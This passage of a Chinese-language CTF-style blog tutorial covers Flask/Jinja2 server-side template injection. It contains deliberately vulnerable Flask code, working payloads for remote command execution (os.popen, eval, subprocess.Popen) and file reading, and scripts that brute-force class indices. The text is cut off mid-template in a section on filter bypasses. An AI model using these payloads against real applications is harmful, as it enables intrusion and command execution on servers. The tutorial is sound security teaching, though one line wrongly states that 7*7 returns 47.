class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<h2 id="关于模板"><a href="#关于模板" class="headerlink" title="关于模板"></a>关于模板</h2><p>模板是为了将视图函数的业务逻辑和HTML 页面展示代码分离，提高代码的可维护性和可读性。通过使用模板引擎(Jinja2)，可以将动态数据插入到预定义的HTML 模板中，生成最终的HTML 页面，避免在视图函数中直接拼接HTML 字符串，从而使代码更加清晰和易于维护。﻿有些需求可能需要一个框架把前后端都写了，一般这种就需要使用模板了，下面进行模板的讲解，后面的模板注入也都是围绕这这个块内容进行的。在当前目录下创建一个<code>templates</code>的目录，flask的模板载入默认就是用当前工作目录的<code>template</code>下的文件，写一个<code>index.html</code>，内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot; /&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt;</span><br><span class="line">    &lt;title&gt;Template&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;模板展示页&lt;/h1&gt;</span><br><span class="line">    &lt;h2&gt;字符串类型&lt;/h2&gt;</span><br><span class="line">    &lt;p&gt;&#123;&#123;my_str&#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt;h2&gt;整型&lt;/h2&gt;</span><br><span class="line">    &lt;p&gt;&#123;&#123;my_int&#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt;h2&gt;数组&lt;/h2&gt;</span><br><span class="line">    &lt;p&gt;&#123;&#123;my_array&#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&#123;&#123;my_array[0]&#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&#123;&#123;my_array[2]&#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt;h2&gt;字典&lt;/h2&gt;</span><br><span class="line">    &lt;p&gt;name:&#123;&#123;my_dict.name&#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;age:&#123;&#123;my_dict.age&#125;&#125;&lt;/p&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>然后运行下面代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    my_str = <span class="string">&quot;hello template&quot;</span></span><br><span class="line">    my_int = <span class="number">12</span></span><br><span class="line">    my_array = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">    my_dict = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;moban&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">18</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(</span><br><span class="line">        <span class="string">&quot;index.html&quot;</span>, my_str=my_str, my_int=my_int, my_array=my_array, my_dict=my_dict</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>此时访问返回的内容如下<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250627185529.png"></p>
<h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p>模板注入漏洞简称SSTI，以flask为例，如果代码不严谨造成此漏洞可能会导致造成任意文件读取和RCE，漏洞的成因一般都是在渲染模板的时候没有严格对用户的输入做控制，或者使用了危险的模板导致用户可以和flask程序进行交互。下面看一个安全的代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="built_in">str</span> = request.args.get(<span class="string">&quot;str&quot;</span>)</span><br><span class="line">    html_str = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;&#123;&#123;str&#125;&#125;&lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_str, <span class="built_in">str</span>=<span class="built_in">str</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里进行输入任何的数据都不会进行计算，而是直接进行渲染，可以尝试参数<code>7*7</code>，后面看一个有问题的代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="built_in">str</span> = request.args.get(<span class="string">&quot;str&quot;</span>)</span><br><span class="line">    html_str = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;&#123;0&#125;&lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        <span class="built_in">str</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这个代码会因为输入的数据而直接修改模板，然后再最终会被模板加载，如果我们在修改模板的时候注入一些计算，例如payload<code>&#123;&#123;7*7&#125;&#125;</code>那么他会直接返回47，这个位置就存在模板注入漏洞。也可以通过下面payload来测试指令的执行<code>&#123;&#123;''.__class__.__mro__&#125;&#125;</code><br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250627195103.png"></p>
<h1 id="简单利用"><a href="#简单利用" class="headerlink" title="简单利用"></a>简单利用</h1><p>在仔细学习flask的ssti前，先学习一下python的类继承关系，后面利用漏洞的时候可以方便理解一些小技巧。首先在代码中写入下面内容</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>(<span class="title class_ inherited__">A</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>(<span class="title class_ inherited__">B</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span>(<span class="title class_ inherited__">B</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = C()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 当前类</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;C的当前类:&quot;</span>, c.__class__)</span><br><span class="line"><span class="comment"># 父类</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;C的父类:&quot;</span>, c.__class__.__base__)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;B的父类:&quot;</span>, c.__class__.__base__.__base__)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;A的父类:&quot;</span>, c.__class__.__base__.__base__.__base__)</span><br><span class="line"><span class="comment"># 直接获取父类链(可以当数组用)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;C的父类链:&quot;</span>, C.__mro__)</span><br><span class="line"><span class="comment"># 查看子类</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;通过C查看B的所有子类:&quot;</span>, C.__mro__[<span class="number">1</span>].__subclasses__())</span><br></pre></td></tr></table></figure>
<p>这些方法的作用如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__class__ <span class="comment"># 查找当前类型的所属对象</span></span><br><span class="line">__base__  <span class="comment"># 查找自己的父类</span></span><br><span class="line">__mro__   <span class="comment"># 查找父类链</span></span><br><span class="line">__subclasses__ <span class="comment"># 查看当前类下的所有子类</span></span><br></pre></td></tr></table></figure>
<p>学习了这些内容之后我们可以看一个存在漏洞的案例，代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="built_in">str</span> = request.args.get(<span class="string">&quot;str&quot;</span>)</span><br><span class="line">    html_str = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;&#123;0&#125;&lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        <span class="built_in">str</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>我们可以尝试获取一下最父类<code>object</code>看一下可以用来执行命令的子类，payload可以用<code>str=&#123;&#123;''.__class__.__base__.__subclasses__()&#125;&#125;</code>含义是获取字符串类<code>string</code>的父类<code>object</code>下的所有子类，然后他会列出很多很多的数据<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250628160325.png"><br>这些数据我们复制出来替换一下<code>,</code>为换行，我们就可以直观的知道他们每一个的数组索引，然后我们在148行发现下面这个类<code>os._wrap_close</code><br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250628160453.png"><br>这个类可以执行命令还有执行代码，一般都会存在这个，索引不固定，但是有些题目可能会禁用掉，这个就得考虑别的了，我们可以使用下面payload获取到这个类<code>str=&#123;&#123;''.__class__.__base__.__subclasses__()[147]&#125;&#125;</code>，147的原因是因为python默认是从0计算索引的，vsc中是从1开始，然后我们可以通过下面的payload来查看一下他是否已经被初始化了<code>str=&#123;&#123;''.__class__.__base__.__subclasses__()[147].__init__&#125;&#125;</code><br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250628160741.png"><br>返回出一个地址即成功，如果是其他的那就说明不能直接使用。继续的我们看一下这个类中所有可用的方法和变量，通过下面payload获取</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">147</span>].__init__.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>同样的返回值会是一大片数据<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250628160943.png"><br>他这里返回数据的方式是字典，我们一般直接去搜索<code>system</code>、<code>eval</code>、<code>popen</code>这些比较危险的函数试试，如果有我们这里可以直接使用，例如<code>eval</code>的使用，payload如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">147</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://image.boychai.xyz/article/Pasted%20image%2020250628162054.png"></p>
<h1 id="常用模块"><a href="#常用模块" class="headerlink" title="常用模块"></a>常用模块</h1><h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><p>文件读取用的object的子类是<code>_frozen_importlib_external.FileLoader</code>，简单的利用payload如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[索引][<span class="string">&quot;get_data&quot;</span>](<span class="number">0</span>,<span class="string">&quot;flag&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://image.boychai.xyz/article/Pasted%20image%2020250628165651.png"></p>
<h2 id="eval命令执行"><a href="#eval命令执行" class="headerlink" title="eval命令执行"></a>eval命令执行</h2><p>参考上面简单利用的案例，需要用到的是<code>os._wrap_close</code>类，这里给一个payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[索引].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="os命令执行"><a href="#os命令执行" class="headerlink" title="os命令执行"></a>os命令执行</h2><p>直接调用os模块可以使用下面的payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://image.boychai.xyz/article/Pasted%20image%2020250628170243.png"><br>还有其他的方式，其他的主要是通过加载过os模块的类去使用os模块，下面也简单介绍一下，以简单利用的环境为例，编写下面脚本来寻找<code>os.py</code>模块</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:5000/&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;str&quot;</span>: <span class="string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[&quot;</span></span><br><span class="line">        + <span class="built_in">str</span>(i)</span><br><span class="line">        + <span class="string">&quot;].__init__.__globals__&#125;&#125;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.get(url, params=data)</span><br><span class="line">    <span class="comment"># response = requests.post(url, params=data)</span></span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;os.py&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>相同的这个脚本也适用于寻找其他模块，具体利用可以直接拼接os模块即可，如下payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[索引].__init__.__globals__.os.popen(<span class="string">&#x27;dir&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>PS：有些模块似乎无法使用，了解当前方法即可。</p>
<h2 id="importlib命令执行"><a href="#importlib命令执行" class="headerlink" title="importlib命令执行"></a>importlib命令执行</h2><p>这个需要利用<code>_frozen_importlib.BuiltinImporter</code>模块，一般他可以直接在<code>objsct</code>的子类中存在，具体利用payload如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[索引][<span class="string">&quot;load_module&quot;</span>](<span class="string">&quot;os&quot;</span>)[<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;dir&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="linecache命令执行"><a href="#linecache命令执行" class="headerlink" title="linecache命令执行"></a>linecache命令执行</h2><p><code>linecache</code>函数可以用来读取任意一个文件的某一行，而且他也引入了os模块，我们可以直接利用他去执行命令，他也是需要去搜索的，具体脚本如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:5000/&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;str&quot;</span>: <span class="string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[&quot;</span></span><br><span class="line">        + <span class="built_in">str</span>(i)</span><br><span class="line">        + <span class="string">&quot;].__init__.__globals__&#125;&#125;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.get(url, params=data)</span><br><span class="line">    <span class="comment"># response = requests.post(url, params=data)</span></span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;linecache&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>具体利用payload如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[索引].__init__.__globals__.linecache.os.popen(<span class="string">&quot;whoami&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="subprocess命令执行"><a href="#subprocess命令执行" class="headerlink" title="subprocess命令执行"></a>subprocess命令执行</h2><p>从python2.4开始，就可以使用<code>subprocess</code>这个模块来产生子进程，并连接到子进程的标准输入&#x2F;输出&#x2F;错误中去，还可以得到子进程的返回值。他的产生似乎是为了替代其他几个老模块和函数产生的，比如<code>os.system</code>、<code>os.popen</code>等函数。他的查找方式可以直接参考简单利用的方式，模块名字是<code>subprocess.Popen</code>，利用payload如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">541</span>](<span class="string">&#x27;whoami&#x27;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>].strip()&#125;&#125;</span><br></pre></td></tr></table></figure>
<h1 id="双括弧绕过"><a href="#双括弧绕过" class="headerlink" title="双括弧绕过"></a>双括弧绕过</h1><p>有些题目可能会把<code>&#123;&#123;`和`&#125;&#125;</code>过滤，或者是通过正则的形式给这俩过滤掉，题目代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter_ssti</span>(<span class="params">input_str</span>):</span><br><span class="line">    <span class="keyword">if</span> input_str <span class="keyword">and</span> (<span class="string">&quot;&#123;&#123;&quot;</span> <span class="keyword">in</span> input_str <span class="keyword">or</span> <span class="string">&quot;&#125;&#125;&quot;</span> <span class="keyword">in</span> input_str):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hack!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> input_str</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    raw_str = request.args.get(<span class="string">&quot;str&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    filtered_str = filter_ssti(raw_str)</span><br><span class="line">    <span class="keyword">if</span> filtered_str == <span class="string">&quot;hack!&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> filtered_str, <span class="number">400</span></span><br><span class="line">    html_str = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;&#123;0&#125;&lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        filtered_str</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>这里只要存在<code>&#123;&#123;`和`&#125;&#125;</code>输入都会触发hack，这里我们需要学习一下<code>jinja2</code>的逻辑渲染，具体的源码可以参考下面模板</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot; /&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt;</span><br><span class="line">    &lt;title&gt;SSTI&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">      .red &#123;</span><br><span class="line">        color: red;</span><br><span class="line">      &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">      &#123;% for girl in girls %&#125; &#123;%if girl | length &gt;= 3 %&#125;</span><br><span class="line">      &lt;li class=&quot;red&quot;&gt;&#123;&#123; girl &#125;&#125;&lt;/li&gt;</span><br><span 